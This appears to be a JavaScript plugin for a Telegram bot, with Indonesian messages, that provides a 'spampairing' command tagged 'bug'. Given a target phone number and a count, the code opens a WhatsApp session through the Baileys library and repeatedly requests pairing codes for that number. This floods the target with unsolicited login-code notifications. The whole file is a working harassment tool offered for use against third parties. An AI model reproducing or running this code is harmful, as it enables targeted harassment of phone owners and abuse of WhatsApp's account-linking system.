let handler = async (ctx, arg, { config, text, command }) => {

  if (!text) return ctx.reply(
  `Contoh: <b>${command} 628xxxxxx|10</b>`, { 
    parse_mode: "HTML" 
    });

  let [targetInput, total = "5"] = text.split("|");
  let target = targetInput.replace(/[^0-9]/g, '').trim();
  
  if (total >= 30) {
    await ctx.reply(`Maksimal jumlah <b>30</b>`, {
      parse_mode: "HTML"
    });
    return
  }
  
  const sentMsg = await ctx.reply(`\`\`\`Mengirim pairing code ke ${target} sebanyak ${total}x...\`\`\``, {
    parse_mode: "Markdown"
  });

  const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require("baileys");
  const { state } = await useMultiFileAuthState("pepek");
  const { version } = await fetchLatestBaileysVersion();
  const pino = require("pino");

  const conn = await makeWaSocket({
    auth: state,
    version,
    logger: pino({ level: "fatal" }),
  });

  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
  for (let i = 0; i < total; i++) {
    await sleep(1500);
    let code = await conn.requestPairingCode(target);
    console.log(`✅ Pairing sent to ${target} | Code: ${code}`);
  }

  await sleep(5000);

  const mentionUser = `[${ctx.from.first_name}](tg://user?id=${ctx.from.id})`;
  ctx.telegram.editMessageText(
    ctx.chat.id,
    sentMsg.message_id,
    undefined,
    `\`\`\`✅ Selesai mengirim pairing code ke ${target} sebanyak ${total}x\`\`\`\n\n📌 Permintaan oleh ${mentionUser}`,
    {
      parse_mode: "Markdown"
    }
  );
};

handler.name = 'spampairing';
handler.type = 'telegram';
handler.trigger = ['text'];
handler.tags = ['bug'];
handler.command = ['spampairing'];
handler.group = true;

module.exports = handler;